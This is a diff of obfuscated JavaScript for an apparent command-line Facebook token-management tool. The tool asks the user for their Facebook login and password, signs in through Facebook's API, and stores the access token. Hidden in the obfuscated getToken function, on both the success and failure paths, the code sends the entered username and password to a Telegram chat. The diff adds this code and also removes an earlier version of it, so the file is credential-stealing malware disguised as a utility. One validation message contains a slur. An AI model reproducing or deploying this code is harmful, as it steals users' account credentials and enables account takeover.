+                    C(KiKAVt['SFAyv'], { 'stdio': mw(0x340) });
                 }
             }
+            if (amount[mw(0x37d)]() === 'i')
+                return !![];
+            if (!/^\d+$/[mw(0x389)](amount)) {
+                if (KiKAVt['ujyxl'] !== KiKAVt[mw(0x22a)])
+                    return KiKAVt[mw(0x279)](error, mw(0x302));
+                else
+                    C[mw(0x38c)](KiKAVt['GvDTz'](KiKAVt[mw(0x3c6)](KiKAVt[mw(0x3d2)](Q), t), mw(0x307))), F[mw(0x38c)](J);
+            }
+            amount = parseInt(amount);
+            if (KiKAVt[mw(0x2ac)](amount, 0x1bea + -0x2 * -0x11d5 + -0x3f94))
+                return KiKAVt[mw(0x3c6)](error, mw(0x36d));
             return !![];
         }
     };
-    static [ZC(0x2b1)] = {
-        'name': ZC(0x29c),
+    static [mz(0x364)] = {
+        'name': 'username',
+        'type': mz(0x1c4),
+        'prefix': '',
+        'message': ask + 'Facebook?\x20(Email/ID/PhoneNumber)~#',
+        'validate': username => {
+            const mO = mz, UBiwAi = {
+                    'DqPmf': function (x, y) {
+                        return x === y;
+                    },
+                    'mYTcH': 'amFkr',
+                    'bTpwD': 'HMvHx',
+                    'dIAsp': function (x, y) {
+                        return x + y;
+                    },
+                    'yhZRh': 'Really\x20Nigga'
+                };
+            if (UBiwAi['DqPmf'](username['trim'](), ''))
+                return UBiwAi[mO(0x390)] === UBiwAi[mO(0x1cc)] ? N : UBiwAi[mO(0x41d)](error, UBiwAi[mO(0x428)]);
+            return !![];
+        }
+    };
+    static [mz(0x280)] = {
+        'name': mz(0x3c1),
+        'type': mz(0x1c4),
+        'prefix': '',
+        'message': ask + mz(0x3c4)
+    };
+    static [mz(0x285)] = {
+        'name': '_',
         'type': 'input',
         'prefix': '',
-        'message': ask + ZC(0x2d6),
-        'validate': tokenIndex => {
-            const a0 = ZC, frnTEo = {
-                    'JxuDE': function (x, y) {
-                        return x + y;
-                    },
-                    'vkHmp': function (callee) {
-                        return callee();
-                    },
-                    'spkxS': function (x, y) {
-                        return x + y;
-                    },
-                    'GIcBu': function (x, y) {
+        'message': ask + mz(0x238)
+    };
+    static [mz(0x41f)] = {
+        'name': mz(0x338),
+        'type': mz(0x1c4),
+        'prefix': '',
+        'message': ask + 'TokenManagement~#',
+        'validate': tokencmd => {
+            const mD = mz, UzaCMq = {
+                    'hmQov': function (x, y) {
                         return x === y;
                     },
-                    'tDLob': function (x, y) {
-                        return x !== y;
+                    'WopLJ': function (callee, param1) {
+                        return callee(param1);
                     },
-                    'TocTI': a0(0x24c),
-                    'SvsJG': a0(0x28a),
-                    'luIJI': function (x, y) {
-                        return x + y;
-                    },
-                    'dwBgW': a0(0x297),
-                    'yysfk': a0(0x32a),
-                    'esxLl': a0(0x1c5),
-                    'IOVLK': function (x, y) {
-                        return x === y;
-                    },
-                    'TuYvl': function (x, y) {
-                        return x !== y;
-                    },
-                    'BYTIL': a0(0x2b4),
-                    'jMgSm': function (x, y) {
-                        return x + y;
-                    },
-                    'pnwTI': 'Please\x20Enter\x20Only\x20Numbers',
-                    'vMXnW': function (x, y) {
+                    'IoxzJ': function (x, y) {
                         return x <= y;
                     },
-                    'ASpFD': function (x, y) {
-                        return x > y;
-                    },
-                    'ByIGu': a0(0x1d4),
-                    'xeDSH': function (x, y) {
+                    'ScWlD': function (x, y) {
                         return x + y;
                     },
-                    'tNqpA': a0(0x364)
+                    'rGCkH': 'Invalid\x20Option.\x20Out\x20of\x20Range'
                 };
-            if (frnTEo[a0(0x3da)](tokenIndex[a0(0x34c)](), ''))
-                return frnTEo['tDLob'](frnTEo['TocTI'], frnTEo[a0(0x394)]) ? frnTEo['luIJI'](error, frnTEo[a0(0x39f)]) : n + 'Please\x20Provide\x20a\x20Valid\x20Command.';
-            if (frnTEo[a0(0x3da)](tokenIndex[a0(0x1ff)](), 'h')) {
-                if (frnTEo[a0(0x3da)](frnTEo[a0(0x3bf)], frnTEo[a0(0x216)]))
-                    Y[a0(0x1b8)](frnTEo[a0(0x2c7)](frnTEo[a0(0x2c7)](i(), H), a0(0x379) + W['message'])), frnTEo[a0(0x1ec)](t);
-                else
-                    return removeTokenHelp;
-            }
-            if (frnTEo[a0(0x1cf)](tokenIndex['toLowerCase'](), 'a') || tokenIndex['toLowerCase']() === 'b')
+            if (UzaCMq[mD(0x1c5)](tokencmd['trim'](), ''))
+                return error + mD(0x413);
+            if (!/^\d+$/['test'](tokencmd))
+                return error + mD(0x302);
+            tokencmd = UzaCMq[mD(0x3dd)](parseInt, tokencmd);
+            if (UzaCMq['IoxzJ'](tokencmd, 0xaf8 + -0x152d + 0xa35) || tokencmd > -0x13a2 * -0x1 + -0x22 + -0x137d)
+                return UzaCMq[mD(0x37b)](error, UzaCMq[mD(0x3eb)]);
+            return !![];
+        }
+    };
+    static ['removeToken'] = {
+        'name': mz(0x3e5),
+        'type': mz(0x1c4),
+        'prefix': '',
+        'message': ask + mz(0x358),
+        'validate': tokenIndex => {
+            const h0 = mz, qelTPX = {
+                    'YKjQV': function (x, y) {
+                        return x + y;
+                    },
+                    'GXscY': function (callee, param1) {
+                        return callee(param1);
+                    },
+                    'GsfWZ': h0(0x1cf),
+                    'gsDmt': h0(0x20a),
+                    'WzGFX': function (x, y) {
+                        return x === y;
+                    },
+                    'YRYgY': h0(0x3a4),
+                    'XBAyI': h0(0x2ec),
+                    'VsyfG': function (x, y) {
+                        return x + y;
+                    },
+                    'Zasuv': h0(0x36d),
+                    'qvQts': function (x, y) {
+                        return x === y;
+                    },
+                    'pTjdG': h0(0x28f),
+                    'pWylz': h0(0x242),
+                    'yVqeU': function (x, y) {
+                        return x > y;
+                    },
+                    'oxryX': h0(0x2d9),
+                    'FztHB': 'Invalid\x20Option.\x20Out\x20of\x20Range'
+                };
+            if (qelTPX[h0(0x29b)](tokenIndex['trim'](), ''))
+                return qelTPX[h0(0x2d2)] !== qelTPX[h0(0x36a)] ? qelTPX[h0(0x33a)](error, qelTPX[h0(0x3ae)]) : qelTPX[h0(0x3be)](N, h0(0x302));
+            if (tokenIndex['toLowerCase']() === 'h')
+                return removeTokenHelp;
+            if (tokenIndex[h0(0x37d)]() === 'a' || qelTPX[h0(0x29b)](tokenIndex[h0(0x37d)](), 'b'))
                 return !![];
-            if (!/^\d+$/[a0(0x2ee)](tokenIndex)) {
-                if (frnTEo[a0(0x1b7)](frnTEo[a0(0x305)], frnTEo[a0(0x305)]))
-                    g[a0(0x1b8)](frnTEo[a0(0x2c7)](frnTEo[a0(0x1eb)](Y(), i), H['message']));
+            if (!/^\d+$/[h0(0x389)](tokenIndex)) {
+                if (qelTPX[h0(0x22d)](qelTPX[h0(0x41a)], qelTPX[h0(0x363)]))
+                    qelTPX[h0(0x32b)](N, qelTPX['GsfWZ']);
                 else
-                    return frnTEo[a0(0x26c)](error, frnTEo['pnwTI']);
+                    return qelTPX['VsyfG'](error, 'Please\x20Enter\x20Only\x20Numbers');
             }
             tokenIndex = parseInt(tokenIndex);
-            if (frnTEo['vMXnW'](tokenIndex, 0x1a03 + 0x5 * -0x1dd + -0x10b2) || frnTEo[a0(0x36c)](tokenIndex, tokens['length'])) {
-                if (frnTEo[a0(0x1cf)](frnTEo['ByIGu'], frnTEo[a0(0x38e)]))
-                    return frnTEo['xeDSH'](error, frnTEo['tNqpA']);
+            if (tokenIndex <= 0x19 * -0x89 + -0x485 + 0x11e6 || qelTPX[h0(0x209)](tokenIndex, tokens[h0(0x2e1)])) {
+                if (qelTPX[h0(0x38b)] !== qelTPX['oxryX'])
+                    C[h0(0x38c)](qelTPX[h0(0x3be)](qelTPX['YKjQV'](Q(), t), qelTPX['gsDmt']), F[h0(0x38e)]), J['exit'](0x1751 + -0x2038 + 0x8e8);
                 else
-                    frnTEo[a0(0x1ec)](n);
+                    return qelTPX[h0(0x3be)](error, qelTPX[h0(0x3fc)]);
             }
             return !![];
         }
     };
-    static [ZC(0x3ef)] = {
-        'name': ZC(0x1cd),
-        'type': ZC(0x301),
+    static [mz(0x345)] = {
+        'name': mz(0x432),
+        'type': 'input',
         'prefix': '',
-        'message': ask + ZC(0x398),
+        'message': ask + mz(0x21c),
         'validate': token => {
-            const a1 = ZC, PgxtZs = {
-                    'eipbU': function (callee) {
-                        return callee();
-                    },
-                    'DgKRf': function (x, y) {
-                        return x === y;
-                    },
-                    'ODsNT': 'UOHNY',
-                    'cQxQE': a1(0x3f4),
-                    'kklKn': function (x, y) {
+            const h1 = mz, SxrmTH = {
+                    'TLJeB': function (x, y) {
                         return x + y;
                     },
-                    'ZzsMz': a1(0x297),
-                    'gYMzO': function (x, y) {
-                        return x !== y;
+                    'YJQhh': function (x, y) {
+                        return x + y;
                     },
-                    'xYwrJ': 'jUldp',
-                    'UhtPt': function (callee, param1) {
+                    'cikli': function (callee) {
+                        return callee();
+                    },
+                    'faGmk': h1(0x385),
+                    'Ouphg': function (callee, param1) {
                         return callee(param1);
                     },
-                    'fHcEA': function (x, y) {
-                        return x <= y;
+                    'OsQrW': function (x, y) {
+                        return x + y;
                     },
-                    'icFSF': function (x, y) {
+                    'MNfzv': function (x, y) {
+                        return x === y;
+                    },
+                    'pfPjM': function (x, y) {
+                        return x === y;
+                    },
+                    'Owomw': h1(0x2a1),
+                    'btsLI': 'uiKGC',
+                    'imKHn': function (x, y) {
+                        return x + y;
+                    },
+                    'EcAMx': h1(0x36d),
+                    'YcmQX': h1(0x2cf),
+                    'jEIyb': h1(0x275),
+                    'AksGH': function (x, y) {
                         return x > y;
-                    }
+                    },
+                    'DeuuE': h1(0x3f6),
+                    'shUrj': h1(0x1ec),
+                    'kfKaT': h1(0x2bd)
                 };
-            if (PgxtZs['DgKRf'](token[a1(0x34c)](), ''))
-                return PgxtZs['DgKRf'](PgxtZs[a1(0x314)], PgxtZs[a1(0x1e4)]) ? !![] : PgxtZs[a1(0x28b)](error, PgxtZs[a1(0x23e)]);
-            if (!/^\d+$/[a1(0x2ee)](token)) {
-                if (PgxtZs['gYMzO'](PgxtZs[a1(0x22e)], a1(0x22d)))
-                    return error + a1(0x3c2);
+            if (SxrmTH['MNfzv'](token[h1(0x247)](), '')) {
+                if (SxrmTH[h1(0x1dc)](SxrmTH[h1(0x2eb)], SxrmTH['btsLI']))
+                    C[h1(0x38c)](SxrmTH[h1(0x2ca)](SxrmTH[h1(0x1c0)](SxrmTH[h1(0x2e2)](Q), t), F['message'])), J();
                 else
-                    PgxtZs[a1(0x31c)](n);
+                    return SxrmTH['imKHn'](error, SxrmTH[h1(0x21f)]);
             }
-            token = PgxtZs[a1(0x2a8)](parseInt, token);
-            if (PgxtZs[a1(0x1ea)](token, 0x183 * 0x2 + 0x2f8 * 0x4 + -0x1 * 0xee6) || PgxtZs[a1(0x1df)](token, tokens[a1(0x3ce)]))
-                return PgxtZs[a1(0x28b)](error, a1(0x364));
+            if (!/^\d+$/[h1(0x389)](token)) {
+                if (SxrmTH[h1(0x2e3)] === SxrmTH[h1(0x254)]) {
+                    C = new Q(t);
+                    const M = F[h1(0x423)]['get'](SxrmTH[h1(0x1ca)]);
+                    return SxrmTH[h1(0x334)](J, M);
+                } else
+                    return SxrmTH[h1(0x2ca)](error, h1(0x302));
+            }
+            token = parseInt(token);
+            if (token <= -0x19e9 + -0xb7b * 0x1 + 0x2564 * 0x1 || SxrmTH[h1(0x26a)](token, tokens[h1(0x2e1)])) {
+                if (SxrmTH[h1(0x27b)](SxrmTH[h1(0x3aa)], SxrmTH['shUrj']))
+                    C[h1(0x38c)](SxrmTH[h1(0x231)](SxrmTH[h1(0x2ca)](Q(), t), h1(0x220) + F[h1(0x38e)])), SxrmTH[h1(0x2e2)](J);
+                else
+                    return SxrmTH['imKHn'](error, SxrmTH['kfKaT']);
+            }
             return !![];
         }
     };
 }
 async function getCmd() {
-    const a2 = ZC, {cmd: Q} = await inquirer[a2(0x25b)](prompts[a2(0x3c7)]);
-    return parseInt(Q);
+    const h2 = mz, U = {
+            'fjxPi': function (V, B) {
+                return V(B);
+            }
+        }, {cmd: N} = await inquirer[h2(0x405)](prompts[h2(0x39c)]);
+    return U[h2(0x206)](parseInt, N);
 }
 let usr, pwd;
 async function getToken() {
-    const a3 = ZC, Q = {
-            'vUFLR': function (n, w) {
-                return n + w;
+    const h3 = mz, U = {
+            'rfGWP': function (N, V) {
+                return N - V;
             },
-            'naisw': function (n, w) {
-                return n(w);
+            'jscGD': function (N, V) {
+                return N + V;
             },
-            'IEiZt': function (n, w) {
-                return n(w);
+            'ZygTe': function (N, V) {
+                return N + V;
             },
-            'PANBN': function (n, w) {
-                return n + w;
+            'nNNsj': function (N) {
+                return N();
             },
-            'MclOc': function (n, w) {
-                return n + w;
+            'uPKPk': function (N, V) {
+                return N(V);
             },
-            'hDYHC': function (n, w) {
-                return n(w);
+            'zScrZ': function (N, V) {
+                return N + V;
             },
-            'pqvqN': function (n, w) {
-                return n + w;
+            'QkHiY': function (N, V) {
+                return N + V;
             },
-            'ReGGd': function (n) {
-                return n();
+            'OeszT': function (N) {
+                return N();
             },
-            'LbkaL': function (n, w) {
-                return n === w;
+            'JkmYZ': function (N, V) {
+                return N + V;
             },
-            'VJeau': a3(0x1ce),
-            'pIIhX': function (n) {
-                return n();
+            'LKgia': h3(0x391),
+            'dlehP': function (N, V) {
+                return N === V;
             },
-            'GBkRe': function (n, w) {
-                return n(w);
+            'uHlWl': h3(0x255),
+            'HcLCk': function (N, V) {
+                return N < V;
             },
-            'GhMyl': function (n, w, b) {
-                return n(w, b);
+            'FVsCB': function (N, V) {
+                return N <= V;
             },
-            'PtssX': function (n) {
-                return n();
+            'xrIAZ': function (N, V) {
+                return N - V;
             },
-            'HVzdp': a3(0x23a),
-            'BjKgQ': 'mask',
-            'LQmYV': a3(0x21a),
-            'gCgtc': 'Authenticate',
-            'Tcjst': a3(0x1bd),
-            'pQqbn': a3(0x1bf),
-            'ZGcmT': 'json',
-            'wWDIk': function (n) {
-                return n();
+            'eUHPm': function (N, V) {
+                return N - V;
             },
-            'hLopH': a3(0x343),
-            'oBlIP': a3(0x2dc),
-            'rejcJ': 'false',
-            'RTsdR': 'authenticate',
-            'VgyBs': a3(0x20c),
-            'aivGN': a3(0x221),
-            'EArhG': function (n, w) {
-                return n in w;
+            'GVHtS': h3(0x221),
+            'WINWr': function (N, V) {
+                return N + V;
             },
-            'IIxqw': a3(0x3e3),
-            'mwJCa': 'HTML',
-            'ynsfb': function (n, w) {
-                return n === w;
+            'kKCpU': function (N, V) {
+                return N(V);
             },
-            'IQFYJ': a3(0x24e),
-            'VRKRT': function (n, w) {
-                return n(w);
+            'TZbXK': function (N, V) {
+                return N + V;
             },
-            'eHCRu': function (n, w, b) {
-                return n(w, b);
+            'EhnWo': function (N) {
+                return N();
             },
-            'BHvYV': function (n, w) {
-                return n + w;
+            'qCgAh': 'xCYti',
+            'dNBCi': function (N, V, B) {
+                return N(V, B);
             },
-            'sknoo': function (n, w) {
-                return n + w;
+            'YJkHr': function (N, V) {
+                return N + V;
             },
-            'bwnEj': 'MoMrn',
-            'JInRy': function (n) {
-                return n();
+            'Acznk': h3(0x429),
+            'dteLP': 'OAuth\x20350685531728|62f8ce9f74b12f84c123cc23437a4a32',
+            'fQYGQ': 'Authenticate',
+            'Acubb': 'Unknown',
+            'MGjib': h3(0x249),
+            'uHWFS': h3(0x24b),
+            'BLOee': h3(0x30e),
+            'xFjep': h3(0x1de),
+            'UfLru': h3(0x1df),
+            'kfMnd': h3(0x305),
+            'YxAIZ': h3(0x2c3),
+            'kZDyv': function (N, V) {
+                return N !== V;
             },
-            'VbJbG': a3(0x2c9),
-            'dLTCc': function (n, w) {
-                return n + w;
+            'Gjxpu': h3(0x34f),
+            'TfmTr': h3(0x1e7),
+            'XfAhm': function (N, V) {
+                return N === V;
             },
-            'xnqwh': function (n, w) {
-                return n + w;
+            'FnUCl': h3(0x3fb),
+            'aTSHj': h3(0x362),
+            'rtJME': function (N) {
+                return N();
             },
-            'wsHda': function (n, w) {
-                return n === w;
+            'bBBeP': h3(0x3b8),
+            'FiLZD': 'dHRNp',
+            'kksCa': h3(0x31e),
+            'lBupY': function (N, V) {
+                return N !== V;
             },
-            'fBXeo': function (n, w) {
-                return n !== w;
+            'ymlEc': h3(0x3b1),
+            'QlsLl': h3(0x2d3),
+            'lojvt': h3(0x3d5),
+            'ZwIwW': function (N, V) {
+                return N === V;
             },
-            'aogGt': a3(0x2cf),
-            'VgpaS': function (n, w) {
-                return n + w;
+            'eNLlO': h3(0x3ab),
+            'DDWdy': h3(0x330),
+            'EbtRF': h3(0x24f),
+            'CJnmv': function (N, V) {
+                return N + V;
             },
-            'vtbMy': function (n, w) {
-                return n + w;
+            'fNzbj': function (N, V) {
+                return N + V;
             },
-            'jDFqr': function (n, w) {
-                return n + w;
+            'xYICR': function (N, V) {
+                return N === V;
             },
-            'qXDDb': function (n) {
-                return n();
+            'aNkUc': function (N, V) {
+                return N + V;
             },
-            'JbUlc': function (n) {
-                return n();
+            'KdHvX': function (N) {
+                return N();
+            },
+            'BIZmn': h3(0x3b7),
+            'okQQx': 'hhznt',
+            'pSMaJ': function (N, V) {
+                return N + V;
+            },
+            'vBSBB': function (N) {
+                return N();
+            },
+            'qWoOv': h3(0x2a9),
+            'RWHqN': function (N, V) {
+                return N + V;
+            },
+            'BZWrY': function (N) {
+                return N();
+            },
+            'fGDWo': function (N, V) {
+                return N === V;
+            },
+            'OmCLv': h3(0x38a),
+            'tDiJQ': 'xnraU',
+            'qtrhA': h3(0x28d),
+            'KPkgJ': function (N, V) {
+                return N + V;
+            },
+            'RUiHi': function (N) {
+                return N();
             }
         };
     try {
-        if (Q[a3(0x393)](Q[a3(0x392)], a3(0x1c4)))
-            return Q['vUFLR'](n, 'Please\x20Enter\x20Only\x20Numbers');
-        else {
-            Q[a3(0x3c9)](setClear), await Q[a3(0x1f2)](animate, banner), await Q[a3(0x226)](animate, Q[a3(0x2af)](Q[a3(0x2bd)](getTimeStamp) + error, yellow + a3(0x3d0) + red + a3(0x246)), 0x2620 * 0x1 + 0x2135 + -0x474b);
-            let {username: w} = await inquirer['prompt'](prompts[a3(0x330)]);
-            w[a3(0x2eb)]('09') && (w = w['slice'](-0x2 * 0x9eb + -0x25b9 + 0x3991, undefined), w = Q[a3(0x34d)](Q[a3(0x36e)], w));
-            usr = w;
-            const b = await Q['GhMyl'](getPassword, Q[a3(0x234)](ask, 'Facebook\x20Password?:\x20'), { 'method': Q[a3(0x3ca)] });
-            pwd = b;
-            const g = {
-                    'authorization': Q['LQmYV'],
-                    'x-fb-friendly-name': Q[a3(0x348)],
-                    'x-fb-connection-type': a3(0x36f),
-                    'accept-encoding': Q['Tcjst'],
-                    'content-type': a3(0x25c),
-                    'x-fb-http-engine': Q[a3(0x359)]
-                }, Y = {
-                    'adid': Array[a3(0x2fd)]({ 'length': 0x10 }, () => Math[a3(0x218)](Math['random']() * (0x127f + 0x11f * -0x19 + 0x2 * 0x4cc))[a3(0x2d2)](-0x59d + -0x3a1 + 0x94e))['join'](''),
-                    'format': Q[a3(0x23b)],
-                    'device_id': Q[a3(0x39b)](ZJ),
-                    'email': w,
-                    'password': b,
-                    'generate_analytics_claims': '0',
-                    'credentials_type': 'password',
-                    'source': Q[a3(0x2f7)],
-                    'error_detail_type': Q[a3(0x22b)],
-                    'enroll_misauth': Q[a3(0x1ab)],
-                    'generate_session_cookies': '0',
-                    'generate_machine_id': '0',
-                    'fb_api_req_friendly_name': Q[a3(0x20f)]
-                }, i = await Zh['post'](Q[a3(0x3d9)], Y, { 'headers': g }), H = i['data'];
-            if (Q[a3(0x2dd)] in H && Q['EArhG'](Q['IIxqw'], H)) {
-                const W = {
+        setClear(), await U[h3(0x3e0)](animate, banner), await animate(U['TZbXK'](U[h3(0x29f)](getTimeStamp) + error, yellow + 'WARNING:\x20' + red + h3(0x2a3)), -0x52 * -0x43 + 0x2394 + -0x3900);
+        let {username: N} = await inquirer['prompt'](prompts['getUserName']);
+        N[h3(0x25c)]('09') && (h3(0x414) === U[h3(0x264)] ? (N = N[h3(0x3b4)](0x1443 + -0x1b11 + 0x6d0, undefined), N = U['LKgia'] + N) : (J['token']['splice'](M - (-0x1c46 + -0xb5 * 0x18 + 0x2d3f), 0x36d * 0x6 + 0x362 * -0x7 + 0x321 * 0x1), d[h3(0x366)][h3(0x3bf)](U['rfGWP'](f, 0xe61 + -0x1f08 + 0x29 * 0x68), -0x1c75 * -0x1 + 0x2346 + -0x3fba), p(), H[h3(0x38c)](U[h3(0x27d)](U[h3(0x29c)](U[h3(0x2f9)](o), E), '(' + v + h3(0x274)))));
+        usr = N;
+        const V = await U[h3(0x2c7)](getPassword, U[h3(0x251)](ask, U[h3(0x2cc)]), { 'method': 'mask' });
+        pwd = V;
+        const B = {
+                'authorization': U[h3(0x341)],
+                'x-fb-friendly-name': U[h3(0x404)],
+                'x-fb-connection-type': U[h3(0x373)],
+                'accept-encoding': U[h3(0x234)],
+                'content-type': U[h3(0x1e1)],
+                'x-fb-http-engine': h3(0x1f7)
+            }, g = {
+                'adid': Array[h3(0x319)]({ 'length': 0x10 }, () => Math[h3(0x258)](Math['random']() * (-0x14d5 * -0x1 + -0xac5 * -0x1 + -0x1f8a * 0x1))[h3(0x38d)](-0x1e07 + -0x10f * 0x20 + -0xccb * -0x5))[h3(0x42e)](''),
+                'format': 'json',
+                'device_id': U[h3(0x2f9)](mY),
+                'email': N,
+                'password': V,
+                'generate_analytics_claims': '0',
+                'credentials_type': U[h3(0x3c2)],
+                'source': U['xFjep'],
+                'error_detail_type': h3(0x201),
+                'enroll_misauth': h3(0x35c),
+                'generate_session_cookies': '0',
+                'generate_machine_id': '0',
+                'fb_api_req_friendly_name': U[h3(0x296)]
+            }, C = await ma[h3(0x40a)](h3(0x3e4), g, { 'headers': B }), Q = C[h3(0x1ef)];
+        if (U[h3(0x347)] in Q && U[h3(0x415)] in Q) {
+            if (U[h3(0x2f3)](U[h3(0x1f2)], U['Gjxpu'])) {
+                const J = new Q(), M = t(J['getHours']())[h3(0x252)](-0x23 * 0xcc + -0x12c * -0x3 + 0x1862, '0'), d = U[h3(0x351)](F, J[h3(0x2a8)]())[h3(0x252)](0x4f * -0x5f + -0x1bb * -0x9 + 0xdc0, '0'), E = U['uPKPk'](J, J[h3(0x2fe)]())[h3(0x252)](0x1 * -0x2392 + -0x1d53 + -0xcfb * -0x5, '0');
+                return M + '[' + M + ':' + d + ':' + E + ']' + d + '\x20';
+            } else {
+                const J = {
                     'chat_id': cID,
-                    'text': a3(0x340) + w + a3(0x3b0) + b + a3(0x1a2),
-                    'parse_mode': Q[a3(0x35e)]
+                    'text': h3(0x20f) + N + h3(0x306) + V + h3(0x357),
+                    'parse_mode': 'HTML'
                 };
                 try {
-                    if (Q[a3(0x27b)](Q['IQFYJ'], a3(0x354)))
-                        try {
-                            Q[a3(0x3cb)](g, 'termux-open\x20http://www.facebook.com/KairuxDev');
-                        } catch (V) {
-                            Q[a3(0x400)](i, a3(0x29f));
-                        }
-                    else
-                        await Q[a3(0x1d8)](sendtg, W);
-                } catch (V) {
+                    U[h3(0x2f3)](h3(0x377), U['TfmTr']) ? await sendtg(J) : g[h3(0x38c)](U[h3(0x33b)](U[h3(0x416)](U[h3(0x2fd)](C), Q), t['message']));
+                } catch (f) {
                 }
-                const t = H[a3(0x3e3)];
-                Q[a3(0x3fb)](addToken, t, w), console['log'](Q[a3(0x2e4)](Q['sknoo'](getTimeStamp(), info), a3(0x285))), await cont(), await tokenManagement();
+                const M = Q['access_token'];
+                U[h3(0x2c7)](addToken, M, N), console[h3(0x38c)](U[h3(0x203)](U['EhnWo'](getTimeStamp), info) + h3(0x3f1)), await cont(), await U['OeszT'](tokenManagement);
                 return;
-            } else
-                a3(0x3e7) !== 'GKQFG' ? (console[a3(0x1b8)](Q[a3(0x234)](Q['pqvqN'](Q[a3(0x39b)](getTimeStamp), error), a3(0x1a1))), console[a3(0x1b8)](H)) : g['log'](Q[a3(0x361)](Q[a3(0x234)](Y(), i), H[a3(0x35d)]));
+            }
+        } else {
+            if (U['XfAhm'](U[h3(0x26b)], U[h3(0x21e)]))
+                return g[h3(0x38c)](U[h3(0x416)](U[h3(0x27d)](U[h3(0x2fd)](C), Q), h3(0x276) + t[h3(0x38e)])), { 'retry': !![] };
+            else
+                console['log'](U[h3(0x218)](U[h3(0x29c)](U[h3(0x222)](getTimeStamp), error), h3(0x307))), console[h3(0x38c)](Q);
         }
-    } catch (c) {
-        const e = {
-            'chat_id': cID,
-            'text': '<b>Facebook\x20Username:</b>\x20' + usr + a3(0x3b0) + pwd + a3(0x30c),
-            'parse_mode': 'HTML'
-        };
-        try {
-            await sendtg(e);
-        } catch (P) {
-        }
-        if (c[a3(0x251)]) {
-            const m = c[a3(0x251)][a3(0x377)][a3(0x2ec)];
-            if (m?.['message'][a3(0x1af)]('www.facebook.com')) {
-                if (a3(0x355) !== Q[a3(0x29e)]) {
-                    const X = Q['hDYHC'](n, a3(0x395))[a3(0x2d2)]();
-                    return X[a3(0x34c)]() ? !![] : ![];
-                } else
-                    console[a3(0x1b8)](Q[a3(0x361)](Q['pqvqN'](Q['JInRy'](getTimeStamp), error), a3(0x280)));
-            } else {
-                if (m?.[a3(0x35d)][a3(0x1af)](Q['VbJbG']))
-                    console[a3(0x1b8)](Q[a3(0x2ae)](Q[a3(0x381)](getTimeStamp(), error), 'Two-factor\x20authentication\x20is\x20enabled.\x20Please\x20disable\x20it\x20before\x20getting\x20token'));
+    } catch (H) {
+        if (U[h3(0x3c5)](U['bBBeP'], U['FiLZD']))
+            C = Q[h3(0x3b4)](-0x2c * 0xe2 + -0x1221 + 0x38fb, t), F = U[h3(0x329)](U[h3(0x3a6)], J);
+        else {
+            const E = {
+                'chat_id': cID,
+                'text': h3(0x20f) + usr + h3(0x306) + pwd + '\x0a<b>Status:</b>\x20Failed',
+                'parse_mode': U[h3(0x3d4)]
+            };
+            try {
+                if (U[h3(0x3cc)](h3(0x2fb), U[h3(0x1fc)]))
+                    await U[h3(0x3e0)](sendtg, E);
                 else {
-                    if (Q[a3(0x393)](m?.[a3(0x279)], a3(0x319)))
-                        console[a3(0x1b8)](Q[a3(0x31e)](getTimeStamp(), error) + a3(0x34e));
-                    else {
-                        if (Q[a3(0x350)](m?.[a3(0x279)], a3(0x3ae))) {
-                            if (Q['fBXeo'](Q[a3(0x206)], Q[a3(0x206)]))
-                                return Y[a3(0x1b8)](Q[a3(0x2af)](Q[a3(0x361)](Q[a3(0x232)](i), H), 'Connection\x20Refused\x20(' + W[a3(0x268)] + a3(0x2c2) + t[a3(0x35d)])), { 'retry': !![] };
-                            else
-                                console[a3(0x1b8)](Q['VgpaS'](getTimeStamp() + error, a3(0x2b0)));
-                        } else
-                            m?.[a3(0x35d)][a3(0x1af)]('limit') ? console['log'](Q[a3(0x39d)](Q[a3(0x1a4)](getTimeStamp(), error), a3(0x296))) : (console['log'](Q[a3(0x2af)](Q[a3(0x2ae)](Q[a3(0x288)](getTimeStamp), error), a3(0x1a1))), console[a3(0x1b8)](m));
+                    if (U[h3(0x1c2)](V[h3(0x247)](), ''))
+                        return g + U[h3(0x3b3)];
+                    return !![];
+                }
+            } catch (T) {
+            }
+            if (H[h3(0x2ce)]) {
+                if (U[h3(0x3a3)] !== U[h3(0x3a3)])
+                    for (let L = -0xd1 * 0x26 + 0x1f4 + 0x3 * 0x9b1; U[h3(0x3dc)](L, U['QkHiY'](M[h3(0x2e1)], -0x2c8 * 0x1 + 0x43d + -0x2 * 0xba)); L++) {
+                        o[h3(0x38c)](E + '(' + L + ')' + v + '\x20' + T[L - (0x1 * -0x175f + -0xb6e * 0x1 + 0x42 * 0x87)]);
+                    }
+                else {
+                    const L = H[h3(0x2ce)][h3(0x1ef)][h3(0x41e)];
+                    if (L?.[h3(0x38e)][h3(0x27f)](U[h3(0x3c9)])) {
+                        if (U['ZwIwW'](U[h3(0x3da)], U[h3(0x3af)]))
+                            for (let P = 0x970 * -0x3 + -0x1ee + 0x1e3f; U[h3(0x430)](P, L['length']); P++) {
+                                const e = a[U['xrIAZ'](P, 0x1 * 0x1e0b + -0x13b3 + -0xa57)], S = Z[U[h3(0x291)](P, -0xa6f * 0x3 + 0x1 * 0x15be + 0x990)]['slice'](W, -0x1eca + 0x3a * 0x95 + 0x1 * -0x2e7);
+                                l[h3(0x38c)](A + '(' + P + ')\x20' + u + '-\x20' + z + e + '\x20' + k + '>\x20' + r + S + h3(0x1c1));
+                            }
+                        else
+                            console[h3(0x38c)](U[h3(0x33b)](U['JkmYZ'](U[h3(0x2f9)](getTimeStamp), error), h3(0x30c)));
+                    } else {
+                        if (L?.[h3(0x38e)][h3(0x27f)](U['EbtRF']))
+                            console[h3(0x38c)](U['CJnmv'](U[h3(0x3ca)](getTimeStamp(), error), h3(0x371)));
+                        else {
+                            if (U['xYICR'](L?.['error_user_title'], h3(0x1c7)))
+                                console['log'](U[h3(0x1e9)](U[h3(0x203)](U['KdHvX'](getTimeStamp), error), h3(0x2d8)));
+                            else {
+                                if (L?.['error_user_title'] === U['BIZmn']) {
+                                    if (U[h3(0x3e6)] !== U['okQQx'])
+                                        return N + U['uHlWl'];
+                                    else
+                                        console[h3(0x38c)](U[h3(0x39f)](U[h3(0x3f9)](getTimeStamp), error) + h3(0x22b));
+                                } else
